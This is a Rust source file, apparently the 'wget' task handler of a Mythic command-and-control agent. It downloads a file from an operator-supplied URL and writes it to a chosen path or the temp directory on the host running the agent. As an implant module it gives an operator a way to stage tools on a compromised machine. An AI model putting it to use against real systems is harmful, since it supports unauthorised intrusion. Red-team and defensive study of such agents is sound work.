//! Download a file from a URL — cross-platform via ureq.

use std::path::Path;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::sys::network::http_request;

#[derive(Deserialize)]
struct Params {
    url: String,
    #[serde(default)]
    path: String,
}

/// Extract a filename from a URL path, or fall back to "download".
fn filename_from_url(url: &str) -> String {
    let path = url.split('?').next().unwrap_or(url);
    let name = path.rsplit('/').next().unwrap_or("download");
    if name.is_empty() { "download" } else { name }.to_string()
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("wget parse error: {e}")),
    };

    // 1. Download
    let body = match http_request(&params.url, "GET", None, None, None, true) {
        Ok(b) => b,
        Err(e) => return TaskResponse::failed(task.id, &format!("download {} failed: {e}", params.url)),
    };

    // 2. Determine destination path
    let dest = if params.path.is_empty() {
        let mut tmp = std::env::temp_dir();
        tmp.push(filename_from_url(&params.url));
        tmp
    } else {
        Path::new(&params.path).to_path_buf()
    };

    // Create parent dirs
    if let Some(parent) = dest.parent() {
        if !parent.as_os_str().is_empty() {
            let _ = std::fs::create_dir_all(parent);
        }
    }

    // 3. Write file
    match std::fs::write(&dest, body.as_bytes()) {
        Ok(_) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(format!(
                "downloaded {} → {} ({} bytes)",
                params.url,
                dest.display(),
                body.len()
            )),
            ..Default::default()
        },
        Err(e) => TaskResponse::failed(task.id, &format!("write {} failed: {e}", dest.display())),
    }
}
